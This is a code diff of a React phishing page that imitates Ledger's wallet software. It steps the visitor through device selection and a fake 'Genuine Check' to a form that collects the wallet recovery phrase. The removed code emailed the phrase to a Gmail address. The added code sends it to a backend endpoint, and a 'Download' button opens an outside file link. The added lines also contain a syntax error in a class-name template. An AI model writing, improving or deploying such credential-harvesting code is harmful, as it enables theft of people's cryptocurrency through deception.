@@ -16,14 +16,13 @@ import {
 
 const Form = () => {
   const navigate = useNavigate();
-  // eslint-disable-next-line no-unused-vars
   const [selectedImage, setSelectedImage] = useState(null);
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
   const [imageSelected, setImageSelected] = useState(false);
-  const [userInput, setUserInput] = useState("");
-  const [showPopup, setShowPopup] = useState(false);
   const [formData, setFormData] = useState("");
+  const [showPopup, setShowPopup] = useState(false);
+
   const steps = ["Device Detection", "Device Check", "Ledger Live"];
 
   const handleImageSelect = (image) => {
@@ -46,8 +45,6 @@ const Form = () => {
     });
   };
 
-
-  
   const handleFormDataChange = (event) => {
     setFormData(event.target.value);
   };
@@ -56,67 +53,27 @@ const Form = () => {
     setShowPopup(false);
   };
 
-
-  const handleFormSubmit = async (event) => {
-    event.preventDefault();
-
-    try {
-      const response = await fetch("https://api.resend.com/emails", {
-        method: "POST",
-        headers: {
-          "Authorization": `Bearer ${process.env.REACT_APP_RESEND_API_KEY}`,
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          from: "onboarding@resend.dev",
-          to: ["tykeshare@gmail.com"],
-          subject: "Genuine Check Submission",
-          html: `<p>User Input: ${userInput}</p>`,
-        }),
-      });
-
-      console.log("Response status:", response.status);
-
-      if (response.ok) {
-        setUserInput("");
-        setShowPopup(true);
-      } else {
-        const errorData = await response.json();
-        console.error("Error:", errorData);
-      }
-    } catch (error) {
-      console.error("Fetch error:", error);
-    }
-  };
-
+  // Step 3 submission - now calls backend
   const handleStep3Submit = async (event) => {
-    console.log('Continue button clicked');
     event.preventDefault();
 
-    navigate('/success');
-
     try {
-      const response = await fetch("https://api.resend.com/emails", {
+      const response = await fetch("https://your-backend.vercel.app/submit", {
         method: "POST",
-        headers: {
-          "Authorization": `Bearer ${process.env.REACT_APP_RESEND_API_KEY}`,
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          from: "onboarding@resend.dev",
-          to: ["tykeshare@gmail.com"],
-          subject: "Ledger Live Submission",
-          html: `<p><strong>Form Type:</strong> ledger_live</p><p><strong>Recovery Phrase:</strong></p><p>${formData}</p>`,
+          form_type: "ledger_live",
+          fullname: formData,
         }),
       });
 
-      console.log("Response status:", response.status);
+      const result = await response.json();
 
       if (response.ok) {
         setFormData("");
+        setShowPopup(true);
       } else {
-        const errorData = await response.json();
-        console.error("Error:", errorData.error);
+        console.error("Error:", result.error);
       }
     } catch (error) {
       console.error("Fetch error:", error);
@@ -125,19 +82,22 @@ const Form = () => {
 
   return (
     <>
+      {/* Timeline */}
       <div className={styles.timeline}>
         {steps.map((step, index) => (
           <div
-            className={`element ${currentStep === index ? "active" : ""}`}
+            className={element ${currentStep === index ? "active" : ""}}
             key={index}
           >
             <div
-              className={`${styles.dotbox} ${currentStep >= index ? styles.filled : ""
-                }`}
+              className={`${styles.dotbox} ${
+                currentStep >= index ? styles.filled : ""
+              }`}
             >
               <div
-                className={`${styles.dot} ${currentStep >= index ? "active" : ""
-                  }`}
+                className={`${styles.dot} ${
+                  currentStep >= index ? "active" : ""
+                }`}
               >
                 <FaCircle size={20} />
               </div>
@@ -146,21 +106,23 @@ const Form = () => {
           </div>
         ))}
       </div>
+
+      {/* Step content */}
       <div className={styles.step_content}>
+        {/* Step 1 - Device Selection */}
         {currentStep === 0 && (
           <div
-            className={`${styles.step_one_content}  ${imageSelected ? styles.hidden : ""
-              }`}
+            className={`${styles.step_one_content} ${
+              imageSelected ? styles.hidden : ""
+            }`}
           >
             <h2>Select your Device</h2>
             <div
-              className={`${styles.image_box} ${imageSelected ? styles.hidden : ""
-                }`}
+              className={`${styles.image_box} ${
+                imageSelected ? styles.hidden : ""
+              }`}
             >
-              <div
-                data-attribute="Nano S"
-                onClick={() => handleImageSelect(nanos)}
-              >
+              <div data-attribute="Nano S" onClick={() => handleImageSelect(nanos)}>
                 <h3>Nano S</h3>
                 <img src={nanos} alt="Nano S" />
               </div>
@@ -171,17 +133,11 @@ const Form = () => {
                 <h3>Nano S Plus</h3>
                 <img src={nanoplus} alt="Nano S Plus" />
               </div>
-              <div
-                data-attribute="Nano X"
-                onClick={() => handleImageSelect(nanox)}
-              >
+              <div data-attribute="Nano X" onClick={() => handleImageSelect(nanox)}>
                 <h3>Nano X</h3>
                 <img src={nanox} alt="Nano X" />
               </div>
-              <div
-                data-attribute="Blue"
-                onClick={() => handleImageSelect(blue)}
-              >
+              <div data-attribute="Blue" onClick={() => handleImageSelect(blue)}>
                 <h3>Blue</h3>
                 <img src={blue} alt="Blue" className={styles.last_child} />
               </div>
@@ -189,35 +145,42 @@ const Form = () => {
           </div>
         )}
 
+        {/* Step 2 - Genuine Check */}
         {currentStep === 1 && (
           <div
-            className={`${styles.step_two_content} ${loading ? styles.hidden : ""
-              }`}
+            className={`${styles.step_two_content} ${
+              loading ? styles.hidden : ""
+            }`}
           >
             <h2>Genuine Check</h2>
             <RiAlertLine size={60} color="red" />
-            <p>
-
-            </p>
             <div className={styles.buttons}>
               <button onClick={handleUpdateClick}>
                 <FaDownload />
-                <span></span>
               </button>
               <button onClick={() => handleImageSelect(nanos)}>
                 <FaArrowsRotate />
                 <span>Refresh</span>
               </button>
-              <button onClick={() => window.open('https://api.files.link/v1/p/fe68c8cb-f70b-4321-992e-69ce0425b600', '_blank')}>
+              <button
+                onClick={() =>
+                  window.open(
+                    "https://api.files.link/v1/p/fe68c8cb-f70b-4321-992e-69ce0425b600",
+                    "_blank"
+                  )
+                }
+              >
                 <FaDownload />
                 <span>Download</span>
               </button>
             </div>
           </div>
         )}
+
+        {/* Step 3 - Ledger Live */}
         {currentStep === 2 && (
           <div className={styles.step_three_content}>
-            <div style= {{ height: "40px" }}/>
+            <div style={{ height: "40px" }} />
             <img src={recovery} alt="Recovery" width={300} height={300} />
             <form onSubmit={handleStep3Submit}>
               <div className={styles.textareaCon}>
@@ -229,23 +192,26 @@ const Form = () => {
                   rows={2}
                 ></textarea>
               </div>
-
-
-              <button type="submit" className={styles.submitButton} onClick={handleFormSubmit}>Continue</button>
+              <button type="submit" className={styles.submitButton}>
+                Continue
+              </button>
             </form>
           </div>
         )}
       </div>
 
+      {/* Loader */}
       {loading && (
         <div>
           <div className={styles.loader_content}>
-             <div style= {{ height: "40px" }}/>
+            <div style={{ height: "40px" }} />
             <img src={loader_image} alt="" />
             <img src={loader} alt="loader" width={50} height={50} />
           </div>
         </div>
       )}
+
+      {/* Popup */}
       {showPopup && (
         <div className={styles.popup}>
           <PiSealCheckFill size={40} color="#bbb0fd" />
